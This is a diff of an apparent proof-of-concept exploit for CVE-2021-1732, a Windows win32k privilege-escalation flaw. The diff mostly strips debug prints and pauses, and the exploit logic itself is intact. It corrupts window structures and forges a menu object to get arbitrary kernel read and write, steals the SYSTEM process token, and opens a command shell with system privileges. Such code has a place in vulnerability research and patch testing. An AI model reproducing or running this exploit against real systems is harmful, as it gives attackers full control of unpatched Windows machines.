@@ -111,22 +111,18 @@ namespace CVE_2021_1732
             CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
             CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL);
         g_HWNDKs[2] = HMValidateHandle(hwnd2, 1);
-        printf("[+] HWNDs: %X, %X, %X\n", g_HWNDs[0], g_HWNDs[1], choosenOne);
-        printf("[+] HWND value: 0x%X, 0x%X\n", choosenOne, hwnd2);
+        // printf("[+] HWNDs: %X, %X, %X\n", g_HWNDs[0], g_HWNDs[1], choosenOne);
         SetWindowLongPtr(choosenOne, offset::tagWND::tagWNDK::cbWndExtra, 0x0fffffff);
         printf("[+] tagWNDK_0's cbWndExtra: 0x%p\n", *reinterpret_cast<ULONG_PTR*>(
             (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::cbWndExtra)));
 
         printf("+----------- setup for arbitry read -------------\n");
         ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_HWNDKs[1] + offset::tagWND::tagWNDK::dwStyle);
-        printf("[+] tagWNDK_1's dwStyle| 0x%p: 0x%p, ", g_HWNDKs[1], ululStyle);
         ululStyle |= 0x4000000000000000L; // add WS_CHILD to tagWNDk1.dwStyle
 
         SetWindowLongPtr(g_HWNDs[0],
             (tag1_reverseBaseOffset - tag0_extraByteAddr) + offset::tagWND::tagWNDK::dwStyle,
             ululStyle);  // modify tagWNDk1.dwStyle
-
-        printf("New dwStyle: 0x%p == 0x%p\n", *(ULONGLONG*)((PBYTE)g_HWNDKs[1] + offset::tagWND::tagWNDK::dwStyle), ululStyle);
 
         g_fakeMenu = (ULONG_PTR)RtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0xA0);
         *(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x98) = (ULONG_PTR)RtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, 0x20);
@@ -138,14 +134,12 @@ namespace CVE_2021_1732
         *(DWORD*)((PBYTE)g_fakeMenu + 0x44) = 2;
         *(ULONG_PTR*)(*(ULONG_PTR*)((PBYTE)g_fakeMenu + 0x58)) = 0x4141414141414141;
 
-        //  ULONG_PTR pSPMenu = SetWindowLongPtr(g_hWnd[1], GWLP_ID, (LONG_PTR)g_pMyMenu);
         ULONG_PTR pSPMenu = SetWindowLongPtr(g_HWNDs[1], GWLP_ID, (LONG_PTR)g_fakeMenu); // change tagWNDK_1->spMenu
 
         ululStyle &= ~0x4000000000000000L;// recovery dwStyle
         SetWindowLongPtr(g_HWNDs[0],
             (tag1_reverseBaseOffset - tag0_extraByteAddr) + offset::tagWND::tagWNDK::dwStyle,
             ululStyle);  // modify tagWNDk1.dwStyle
-        printf("[+] Recovered dwStyle: 0x%p\n", *(ULONGLONG*)((PBYTE)g_HWNDKs[1] + offset::tagWND::tagWNDK::dwStyle));
         printf("[+] tagWNDK_1 pSPMenu a: 0x%p\n", pSPMenu);
 
 
@@ -171,7 +165,7 @@ namespace CVE_2021_1732
                 arbitryRead0x10Size(low + offset::EPROCESS::Token, systemTokenVal, high);
                 break;
             }
-            else if (pid == currentPid) {
+            else if (pid == currentPid) { //重新寻找真的EProcess
                 currentEprocess = low;
                 currentTokenAddr = currentEprocess + offset::EPROCESS::Token;
             }
@@ -191,15 +185,6 @@ namespace CVE_2021_1732
             getchar();
             SetWindowLongPtr(g_HWNDs[0], tag1_reverseBaseOffset - tag0_extraByteAddr + offset::tagWND::tagWNDK::pExtraByte, old); //恢复tagWNDK_1->pExtraByte
             system("cmd");
-            // STARTUPINFO si = { sizeof(si) };
-            // PROCESS_INFORMATION pi = { 0 };
-            // si.dwFlags = STARTF_USESHOWWINDOW;
-            // si.wShowWindow = SW_SHOW;
-            // WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
-            // BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
-            // if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
-
-            getchar();
         }
 
     clean:
@@ -240,40 +225,10 @@ namespace CVE_2021_1732
             SetWindowLongPtr(g_HWNDs[0], tag1_reverseBaseOffset - tag0_extraByteAddr + offset::tagWND::tagWNDK::dwStyle, ululStyle);  //Modify Remove Style WS_CHILD
             printf("[*] tagWNDK_1->real_menu style: 0x%p\n", ululStyle);
         }
-        getchar();
 
         DestroyWindow(g_HWNDs[0]);
-        getchar();
-
-
-        printf("real spMenu : %p\n", pSPMenu);
-        printf("current spMenu : %p\n",
-            *(ULONG_PTR*)((PBYTE)g_HWNDKs[1] +
-                offset::tagWND::tagWNDK::spMenu));
-        getchar();
-        DestroyWindow(g_HWNDs[1]); //FIXME: 回收错误
-        getchar();
-
+        DestroyWindow(g_HWNDs[1]);
         DestroyWindow(choosenOne);
-        getchar();
-        // system("cmd");
-
-        //--------- HWND research Part -------------
-
-        // HWND hwnd;
-
-        // hwnd = CreateWindowExW(0, L"TypeA", L"wndexp",
-        //     CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
-        //     CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL);
-        // printf("HWND value: 0x%x\n", hwnd);
-        // getchar();
-        // int a = 0xDEADBEEF;
-        // SetWindowLong(hwnd, 0, a);
-        // printf("[+] Write in: 0x%x\n", hwnd, a);
-        // getchar();
-        // LONG_PTR retrievedValue = GetWindowLong(hwnd, 0);
-        // printf("[+] Read with: 0x%x\n", retrievedValue);
-        // getchar();
 
         return true;
     }
